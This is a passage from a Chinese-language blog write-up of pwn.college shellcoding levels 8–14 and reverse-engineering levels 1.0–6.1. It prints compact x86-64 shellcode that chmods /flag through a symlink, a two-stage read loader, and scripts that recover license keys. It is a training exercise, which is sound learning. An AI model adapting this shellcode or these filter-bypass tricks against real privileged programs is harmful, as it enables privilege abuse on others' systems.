<h4 id="level8-2"><a href="#level8-2" class="headerlink" title="level8"></a>level8</h4><p>限制在<code>0x12</code>个字节的shellcode，通过<code>chmod</code>系统调用，修改&#x2F;flag的权限即可。</p>
<p>好神奇的软链接！</p>
<blockquote>
<p>linux下，软链接到一个程序时，修改这个软连接文件会导致原文件的权限也被修改。因此可以通过软链接来重命名一个a文件，0x61这样就能减少字节数。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">    push 0x61</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    push 4</span><br><span class="line">    pop rsi</span><br><span class="line">    push 0x5a</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>



<h4 id="level9-1"><a href="#level9-1" class="headerlink" title="level9"></a>level9</h4><p>本来想通过<code>jmp [rip+10]</code>指令然后+nop填充来跳过int3的，但是这条指令就占了6个字节。后来发现jmp  标签只需要两个字节。更简单。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">    push 0x61</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    push 4</span><br><span class="line">    pop rsi</span><br><span class="line">    jmp next</span><br><span class="line">    .rept 0xa</span><br><span class="line">    nop</span><br><span class="line">    .endr</span><br><span class="line">next:</span><br><span class="line">    push 0x5a</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br><span class="line">    push 60					# sys_exit</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="level10-1"><a href="#level10-1" class="headerlink" title="level10"></a>level10</h4><p>它的过滤器如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> *input = shellcode_mem;</span><br><span class="line"><span class="type">int</span> sort_max = shellcode_size / <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>) - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; sort_max; i++)</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; sort_max-i<span class="number">-1</span>; j++)</span><br><span class="line">        <span class="keyword">if</span> (input[j] &gt; input[j+<span class="number">1</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">uint64_t</span> x = input[j];</span><br><span class="line">            <span class="type">uint64_t</span> y = input[j+<span class="number">1</span>];</span><br><span class="line">            input[j] = y;</span><br><span class="line">            input[j+<span class="number">1</span>] = x;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>而我的shellcode只有13个字节，13&#x2F;8 &#x3D; 1。再减1就是0。那么就不会执行过滤器。所以我执行后就拿到了flag。它实际会将16个字节以上的shellcode进行排序。</p>
<h4 id="level11-1"><a href="#level11-1" class="headerlink" title="level11"></a>level11</h4><p>这道题是level10 加上删去读取stdin。可是使用chmod修改权限的shellcode压根就不需要stdin。网友还是厉害，想到了<code>chmod</code>这个方法。后面的几关都直接过了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">    push 0x61</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    push 4</span><br><span class="line">    pop rsi</span><br><span class="line">    push 0x5a</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br><span class="line">    </span><br></pre></td></tr></table></figure>



<h4 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h4><p>This challenge requires that every byte in your shellcode is unique!</p>
<p>这一关需要每个字节是第一次使用，也就是没有重复的字节出现。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">    push 0x61</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    mov bl, 0x4</span><br><span class="line">    xor esi, ebx</span><br><span class="line">    mov al, 0x5a</span><br><span class="line">    syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>我居然一直不知道esi寄存器的存在，我以为只有a,b,c,d寄存器会有32位，16位，8位寄存器。</p>
<p>通用寄存器都有低至16位的寄存器。</p>
</blockquote>
<h4 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h4><p>限制shellcode为0xc个字节！上面的exp还能删减一下。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">    push 0x61</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    xor esi, 0x4</span><br><span class="line">    mov al, 0x5a</span><br><span class="line">    syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这样就正好是0xc个字节。</p>
<h4 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h4><p>shellcode只能是6个字节，我靠。看看人家的wp做吧，没有什么思路。</p>
<p>发现得用当时的一些寄存器来达成目标。在调用我们的shellcode时，可以看到rax是0。并且</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> RAX  0x0</span><br><span class="line"> RBX  0x627f8b68e7e0 (__libc_csu_init) ◂— endbr64 </span><br><span class="line"> RCX  0x766dd2e1e297 (write+23) ◂— cmp rax, -01000h /* &#x27;H=&#x27; */</span><br><span class="line"> RDX  0x26a69000 ◂— push 61h /* 0x83e78948616a */</span><br><span class="line"> RDI  0x766dd2efe7e0 (_IO_stdfile_1_lock) ◂— 0x0</span><br><span class="line"> RSI  0x766dd2efd723 (_IO_2_1_stdout_+131) ◂— 0xefe7e0000000000a /* &#x27;\n&#x27; */</span><br><span class="line"> R8   0x16</span><br><span class="line"> R9   0x10</span><br><span class="line"> R10  0x627f8b68f113 ◂— 0x525245000000000a /* &#x27;\n&#x27; */</span><br><span class="line"> R11  0x246</span><br><span class="line"> R12  0x627f8b68e200 (_start) ◂— endbr64 </span><br><span class="line"> R13  0x7ffe2e2e5a80 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x7ffe2e2e5990 ◂— 0x0</span><br><span class="line">*RSP  0x7ffe2e2e5948 —▸ 0x627f8b68e7c3 (main+636) ◂— lea rdi, [rip + 0cdah]</span><br><span class="line">*RIP  0x26a69000 ◂— push 61h /* 0x83e78948616a */</span><br></pre></td></tr></table></figure>

<p>rax为0，那么就是read系统调用号。read系统调用的第一个参数rdi为文件描述符，需要为0。第二个参数rsi为读取存放的地址，这里应该就是rdx&#x2F;rdi都行。第三个参数rdx为0x26a6900为写入的字节数。</p>
<p>那么也就是需要重写rdi寄存器和rsi寄存器即可。stageone的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">    xor edi, edi</span><br><span class="line">    mov esi, edx</span><br><span class="line">    syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>随后，把stagetwo的代码读入即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">    .rept 0x10</span><br><span class="line">    nop</span><br><span class="line">    .endr</span><br><span class="line">    push 0x61</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    xor esi, 0x4</span><br><span class="line">    mov al, 0x5a</span><br><span class="line">    syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>需要一个填充，因为前六个字节也被覆盖了，因此执行只能从第七个字节开始。</p>
<p>最后的命令是<code>cat stageone-raw shellcode-raw | /challenge/babyshell_level14</code>。抽象的是，我在gdb里调试了半天，stageone的代码一直无法进行系统调用，我以为是代码的问题，实际上是权限不够，无法进行syscall。</p>
<h3 id="Reverse-Engineering"><a href="#Reverse-Engineering" class="headerlink" title="Reverse Engineering"></a>Reverse Engineering</h3><h4 id="level1-0"><a href="#level1-0" class="headerlink" title="level1.0"></a>level1.0</h4><p>这题很简单哇，就是把输入的字符串转成了ascii。对应输入即可获得flag</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Ready to receive your license key!</span><br><span class="line"></span><br><span class="line">quit</span><br><span class="line">Initial input:</span><br><span class="line"></span><br><span class="line">        71 75 69 74 0a </span><br><span class="line"></span><br><span class="line">The mangling is done! The resulting bytes will be used for the final comparison.</span><br><span class="line"></span><br><span class="line">Final result of mangling input:</span><br><span class="line"></span><br><span class="line">        71 75 69 74 0a </span><br><span class="line"></span><br><span class="line">Expected result:</span><br><span class="line"></span><br><span class="line">        63 6c 6a 79 62 </span><br><span class="line"></span><br><span class="line">Checking the received license key!</span><br></pre></td></tr></table></figure>

<h4 id="level1-1"><a href="#level1-1" class="headerlink" title="level1.1"></a>level1.1</h4><p>这下没有回显了，只能通过工具逆向一下子了。</p>
<img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241107202238497.png" class="" title="image-20241107202238497">

<p>也很简单啊，直接看到了匹配的字符串。</p>
<h4 id="level2-0"><a href="#level2-0" class="headerlink" title="level2.0"></a>level2.0</h4><p>依然，使用IDA 看看：</p>
<img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241107202710303.png" class="" title="image-20241107202710303">

<p>但是输入会把最后两个字节翻转。最后输入xzujs即可。</p>
<h4 id="level2-1"><a href="#level2-1" class="headerlink" title="level2.1"></a>level2.1</h4><p>依然是，没有回显。简单查看一下逆向出来的源码。</p>
<img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241107204303139.png" class="" title="image-20241107204303139">

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">movzx   eax, byte ptr [rbp+buf+2]</span><br><span class="line">mov     byte ptr [rbp+var_10], al</span><br><span class="line">movzx   eax, byte ptr [rbp+buf+3]</span><br><span class="line">mov     byte ptr [rbp+var_10+1], al</span><br><span class="line">movzx   eax, byte ptr [rbp+var_10+1]</span><br><span class="line">mov     byte ptr [rbp+buf+2], al</span><br><span class="line">movzx   eax, byte ptr [rbp+var_10]</span><br><span class="line">mov     byte ptr [rbp+buf+3], al</span><br></pre></td></tr></table></figure>

<p>其中，<code>rbp+buf</code>是用户输入的地址。按照逻辑分析：该代码将用户输入的第3个字节给了<code>rbp+var_10</code>位置。第4个字节给了<code>rbp+var_10+1</code>位置，随后第4个字节给了第3个字节位置。第3个字节给了第4个字节位置。综合起来即，将用户输入的第三、四个字节位置交换。</p>
<p>那么输入<code>loodc</code>即可。</p>
<h4 id="level3-0"><a href="#level3-0" class="headerlink" title="level3.0"></a>level3.0</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">quit</span><br><span class="line">Initial input:</span><br><span class="line"></span><br><span class="line">        71 75 69 74 0a </span><br><span class="line"></span><br><span class="line">This challenge is now mangling your input using the `reverse` mangler.</span><br><span class="line"></span><br><span class="line">This mangled your input, resulting in:</span><br><span class="line"></span><br><span class="line">        0a 74 69 75 71 </span><br></pre></td></tr></table></figure>

<p>显然，这是将输入进行逆序了。<img src="/2025/03/01/pwn-college-题解/image-20241107210124444.png"  alt="image-20241107210124444" style="zoom:200%;" /></p>
<p>其实也不用IDA，通过回显的ASCII码可以推出要的结果。</p>
<p>最后输入<code>sikky</code>即可。</p>
<h4 id="level3-1"><a href="#level3-1" class="headerlink" title="level3.1"></a>level3.1</h4><p>查看源码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">loc_153E:</span><br><span class="line">mov     eax, [rbp+var_14]</span><br><span class="line">cdqe</span><br><span class="line">movzx   eax, byte ptr [rbp+rax+buf]</span><br><span class="line">mov     [rbp+var_16], al</span><br><span class="line">mov     eax, 4</span><br><span class="line">sub     eax, [rbp+var_14]</span><br><span class="line">cdqe</span><br><span class="line">movzx   eax, byte ptr [rbp+rax+buf]</span><br><span class="line">mov     [rbp+var_15], al</span><br><span class="line">mov     eax, [rbp+var_14]</span><br><span class="line">cdqe</span><br><span class="line">movzx   edx, [rbp+var_15]</span><br><span class="line">mov     byte ptr [rbp+rax+buf], dl</span><br><span class="line">mov     eax, 4</span><br><span class="line">sub     eax, [rbp+var_14]</span><br><span class="line">cdqe</span><br><span class="line">movzx   edx, [rbp+var_16]</span><br><span class="line">mov     byte ptr [rbp+rax+buf], dl</span><br><span class="line">add     [rbp+var_14], 1</span><br></pre></td></tr></table></figure>

<img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241107211657926.png" class="" title="image-20241107211657926">

<blockquote>
<p>cdqe指令：EAX符号位拓展到RAX</p>
</blockquote>
<img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241107212701406.png" class="" title="image-20241107212701406">

<p>有点抽象的是，无法知道[rbp+var_14]的值，因此手动分析不出来哇。通过IDA查看源码，发现循环了两次，第一次是交换第一个字节和第5个字节。第二次是交换第二个字节和第4个字节。因此就是一个逆序。</p>
<p>然后，<img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241107213541957.png" class="" title="image-20241107213541957"></p>
<p>最后输入<code>ruhsi</code>即可。</p>
<h4 id="level4-0"><a href="#level4-0" class="headerlink" title="level4.0"></a>level4.0</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">quit</span><br><span class="line">Initial input:</span><br><span class="line"></span><br><span class="line">        71 75 69 74 0a </span><br><span class="line"></span><br><span class="line">This challenge is now mangling your input using the `sort` mangler.</span><br><span class="line"></span><br><span class="line">This mangled your input, resulting in:</span><br><span class="line"></span><br><span class="line">        0a 69 71 74 75</span><br></pre></td></tr></table></figure>

<p>最后一个字节，去了第一个位置。第三个字节去了第二个位置，第一个字节去了第三个位置，第四个位置没动，第二个字节去了第五个位置。</p>
<p><code>66 71 72 77 78</code>，这是期待的字符串，也就是<code>fqrwx</code></p>
<p>最后输入<code>xrfwq</code>即可。</p>
<p>qfxwr</p>
<h4 id="level4-1"><a href="#level4-1" class="headerlink" title="level4.1"></a>level4.1</h4><p>这道题也是一样的，按照上面的逻辑进行翻转。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">4</span> - i; ++j )</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span> ( *((_BYTE *)&amp;buf + j) &gt; *((_BYTE *)&amp;buf + j + <span class="number">1</span>) )</span><br><span class="line">     &#123;</span><br><span class="line">       v3 = *((_BYTE *)&amp;buf + j);</span><br><span class="line">       *((_BYTE *)&amp;buf + j) = *((_BYTE *)&amp;buf + j + <span class="number">1</span>);</span><br><span class="line">       *((_BYTE *)&amp;buf + j + <span class="number">1</span>) = v3;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>分析一下，i &#x3D; 0 的情况下，j由0到3，前五个字节。那么这里会有一个判断，即将ascii值最大的字节放至第5个位置；i &#x3D; 1的情况下，j由0到2，前4个字节。将ascii值最大的字节放至第4个位置。以此类推。这是冒泡排序，对前5个字节进行冒泡排序。将ascii码值由小到大排序。</p>
</blockquote>
<img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241107214343087.png" class="" title="image-20241107214343087">



<p>最后输入<code>almrv的任意排序</code>即可。因此，我在level4.0发现的规律是错误的。</p>
<h4 id="level5-0"><a href="#level5-0" class="headerlink" title="level5.0"></a>level5.0</h4><p>This challenge is now mangling your input using the <code>xor</code> mangler with key <code>0xb7</code></p>
<p>与0xb7异或。异或的操作是可逆的，那么再异或回去就好了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">&gt;&gt;&gt; 0xc3 ^ 0xb7</span><br><span class="line">116</span><br><span class="line">&gt;&gt;&gt; hex(0xc3 ^ 0xb7)</span><br><span class="line">&#x27;0x74&#x27;</span><br><span class="line">&gt;&gt;&gt; hex(0xc2 ^ 0xb7)</span><br><span class="line">&#x27;0x75&#x27;</span><br><span class="line">&gt;&gt;&gt; hex(0xdf ^ 0xb7)</span><br><span class="line">&#x27;0x68&#x27;</span><br><span class="line">&gt;&gt;&gt; hex(0xc7 ^ 0xb7)</span><br><span class="line">&#x27;0x70&#x27;</span><br><span class="line">&gt;&gt;&gt; hex(0xc4 ^ 0xb7)</span><br><span class="line">&#x27;0x73&#x27;</span><br><span class="line">&gt;&gt;&gt; </span><br></pre></td></tr></table></figure>

<p>用python终端，即可。最终输入<code>tuhps</code>即可。</p>
<h4 id="level5-1"><a href="#level5-1" class="headerlink" title="level5.1"></a>level5.1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    *((_BYTE *)&amp;buf + i) ^= <span class="number">0x41u</span>;</span><br></pre></td></tr></table></figure>

<p>异或的字节为0x41，目标字符串是<code>.data:0000000000004010 a056            db &#39;0&#39;,27h,27h,&#39;56&#39;,0</code></p>
<p>异或一下。最终输入<code>qfftw</code>即可。</p>
<h4 id="level6-0"><a href="#level6-0" class="headerlink" title="level6.0"></a>level6.0</h4><p>This challenge is now mangling your input using the <code>xor</code> mangler with key <code>0xbf46</code></p>
<p>This challenge is now mangling your input using the <code>sort</code> mangler.</p>
<p>This challenge is now mangling your input using the <code>swap</code> mangler for indexes <code>0</code> and <code>9</code>.</p>
<p>强度一下就上来啦，xor，sort和swap三种方法。</p>
<p>目标</p>
<p>字符串为：<code>cd 20 25 27 27 28 31 35 c8 20 ce cf d1 d5 d9 dc</code>，写个脚本跑就好了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;/challenge/babyrev_level6.0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 20 20 25 27 27 28 31 35 c8 cd ce cf d1 d5 d9 dc</span></span><br><span class="line">hex_string=[<span class="number">0x20</span>,<span class="number">0x20</span>,<span class="number">0x25</span>,<span class="number">0x27</span>,<span class="number">0x27</span>,<span class="number">0x28</span>,<span class="number">0x31</span>,<span class="number">0x35</span>,<span class="number">0xc8</span>,<span class="number">0xcd</span>,<span class="number">0xce</span>,<span class="number">0xcf</span>,<span class="number">0xd1</span>,<span class="number">0xd5</span>,<span class="number">0xd9</span>,<span class="number">0xdc</span>]</span><br><span class="line">payload=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># xor</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(hex_string) - <span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    payload += <span class="built_in">chr</span>(hex_string[i] ^ <span class="number">0xbf</span>)</span><br><span class="line">    payload += <span class="built_in">chr</span>(hex_string[i+<span class="number">1</span>] ^ <span class="number">0x46</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendafter(<span class="string">&#x27;Ready to receive your license key!\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">data = io.recvall()</span><br><span class="line"><span class="built_in">print</span>(data.decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>因为有sort的关系，并且最终的结果也确实sort后swap就能达到。因此只需要将目标字符串从小到大排序后，异或0xbf46即可。</p>
</blockquote>
<h4 id="level6-1"><a href="#level6-1" class="headerlink" title="level6.1"></a>level6.1</h4><p><strong><img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241108212052627.png" class="" title="image-20241108212052627"></strong></p>
<p>目标字符串为<code>0x80, 0xD8, 0x4E, 0xC7, 0X99, 0x0B, 0x8B, 0xC8, 0x45, 0xC0, 0x86, 0x06, 0x84, 0xC2, 0x5F, 0xD6, 0x82, 0x03, 0x83</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">18</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  v3 = i % <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( i % <span class="number">3</span> == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *((_BYTE *)buf + i) ^= <span class="number">0xEBu</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v3 &lt;= <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">        *((_BYTE *)buf + i) ^= <span class="number">0x37u</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *((_BYTE *)buf + i) ^= <span class="number">0xF1u</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">8</span>; ++j )</span><br><span class="line">&#123;</span><br><span class="line">  v4 = *((_BYTE *)buf + j);</span><br><span class="line">  *((_BYTE *)buf + j) = *((_BYTE *)buf + <span class="number">18</span> - j);</span><br><span class="line">  *((_BYTE *)buf + <span class="number">18</span> - j) = v4;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">18</span>; ++k )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( k % <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( k % <span class="number">2</span> == <span class="number">1</span> )</span><br><span class="line">      *((_BYTE *)buf + k) ^= <span class="number">0x46u</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *((_BYTE *)buf + k) ^= <span class="number">0x1Du</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终脚本为：</p>
